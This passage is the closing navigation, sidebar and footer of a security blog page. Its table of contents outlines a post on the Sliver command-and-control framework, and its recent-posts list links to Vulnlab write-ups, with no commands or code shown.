<li><a target="_blank" rel="noopener" href="https://bishopfox.com/blog/passing-the-osep-exam-using-sliver">https://bishopfox.com/blog/passing-the-osep-exam-using-sliver</a></li>
</ul>
</article><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/07/14/Phantom-Vulnlab/" title="Phantom - Vulnlab"><img class="cover" src="https://wiki.vulnlab.com/~gitbook/image?url=https%3A%2F%2F3528174365-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FI3I73FFqB6GvT8N5Mt1N%252Fuploads%252FIdhQ6ryzfjA7Ybr9rjxo%252Fphantom_slide.png%3Falt%3Dmedia%26token%3Debd59b85-19c7-492c-b314-17222b2bc95e&amp;width=768&amp;dpr=4&amp;quality=100&amp;sign=e25427a4&amp;sv=1" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">Phantom - Vulnlab</div></div></a></div><div class="next-post pull-right"><a href="/2024/06/26/ADCS-Attacks-with-Certipy/" title="ADCS Attacks with Certipy"><img class="cover" src="https://serioton.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F9163bddd-7f46-4e82-a292-895fe15866d3%2F55bd30fb-924f-4b62-8c2d-8ef5b2b0bc34%2Fcat.png?table=block&amp;id=35840b9b-8958-455b-83ed-312be6e09422&amp;spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&amp;width=2000&amp;userId=&amp;cache=v2" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">ADCS Attacks with Certipy</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/cat.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">serioton</div><div class="author-info__description">cat</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">27</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://twitter.com/seriotonctf"><i class="fab fa-twitter"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/seriotonctf" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="https://twitter.com/seriotonctf" target="_blank" title="Twitter"><i class="fab fa-twitter"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Installation"><span class="toc-text">Installation</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Multiplayer-Mode"><span class="toc-text">Multiplayer Mode</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Installing-the-tools"><span class="toc-text">Installing the tools</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Basic-Commands"><span class="toc-text">Basic Commands</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Setup-a-listener"><span class="toc-text">Setup a listener</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#List-and-kill-jobs"><span class="toc-text">List and kill jobs</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Beacons"><span class="toc-text">Beacons</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Generating-beacons"><span class="toc-text">Generating beacons</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Listing-and-interacting-with-beacons"><span class="toc-text">Listing and interacting with beacons</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Sessions"><span class="toc-text">Sessions</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Other-useful-commands"><span class="toc-text">Other useful commands</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#execute-assembly"><span class="toc-text">execute-assembly</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getsystem"><span class="toc-text">getsystem</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ps"><span class="toc-text">ps</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#socks5"><span class="toc-text">socks5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sideload"><span class="toc-text">sideload</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Conclusion"><span class="toc-text">Conclusion</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Resources"><span class="toc-text">Resources</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/08/25/Retro2-Vulnlab/" title="Retro2 - Vulnlab"><img src="https://assets.vulnlab.com/retro2_slide.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Retro2 - Vulnlab"/></a><div class="content"><a class="title" href="/2024/08/25/Retro2-Vulnlab/" title="Retro2 - Vulnlab">Retro2 - Vulnlab</a><time datetime="2024-08-25T18:53:34.000Z" title="Created 2024-08-25 18:53:34">2024-08-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/08/18/Reflection-Vulnlab/" title="Reflection - Vulnlab"><img src="https://assets.vulnlab.com/reflection_slide.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Reflection - Vulnlab"/></a><div class="content"><a class="title" href="/2024/08/18/Reflection-Vulnlab/" title="Reflection - Vulnlab">Reflection - Vulnlab</a><time datetime="2024-08-18T22:34:29.000Z" title="Created 2024-08-18 22:34:29">2024-08-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/08/10/Windows-Privesc/" title="Windows Privilege Escalation"><img src="https://serioton.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F9163bddd-7f46-4e82-a292-895fe15866d3%2Feb66e480-7ab5-4a3e-bbd1-9c56c1cf2b3f%2Fcat2.png?table=block&amp;id=47c9e554-38f8-4c65-81cc-abad857404d6&amp;spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&amp;width=1420&amp;userId=&amp;cache=v2" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Windows Privilege Escalation"/></a><div class="content"><a class="title" href="/2024/08/10/Windows-Privesc/" title="Windows Privilege Escalation">Windows Privilege Escalation</a><time datetime="2024-08-10T15:00:00.000Z" title="Created 2024-08-10 15:00:00">2024-08-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/07/24/RBCD-Notes/" title="Abusing Resource-Based Constrained Delegation"><img src="https://serioton.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F9163bddd-7f46-4e82-a292-895fe15866d3%2F706ec838-be82-4b2b-8c99-8d6277ab92cd%2Fcat.png?table=block&amp;id=07e71d74-f62d-4bd0-89ed-82ea3ead23d8&amp;spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&amp;width=1420&amp;userId=&amp;cache=v2" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Abusing Resource-Based Constrained Delegation"/></a><div class="content"><a class="title" href="/2024/07/24/RBCD-Notes/" title="Abusing Resource-Based Constrained Delegation">Abusing Resource-Based Constrained Delegation</a><time datetime="2024-07-24T16:33:01.000Z" title="Created 2024-07-24 16:33:01">2024-07-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/07/14/Phantom-Vulnlab/" title="Phantom - Vulnlab"><img src="https://wiki.vulnlab.com/~gitbook/image?url=https%3A%2F%2F3528174365-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FI3I73FFqB6GvT8N5Mt1N%252Fuploads%252FIdhQ6ryzfjA7Ybr9rjxo%252Fphantom_slide.png%3Falt%3Dmedia%26token%3Debd59b85-19c7-492c-b314-17222b2bc95e&amp;width=768&amp;dpr=4&amp;quality=100&amp;sign=e25427a4&amp;sv=1" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Phantom - Vulnlab"/></a><div class="content"><a class="title" href="/2024/07/14/Phantom-Vulnlab/" title="Phantom - Vulnlab">Phantom - Vulnlab</a><time datetime="2024-07-14T10:32:45.000Z" title="Created 2024-07-14 10:32:45">2024-07-14</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/train_travel_illustration-wallpaper-1920x1080.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2024 By serioton</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">ฅ^•ﻌ•^ฅ</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div></div></body></html>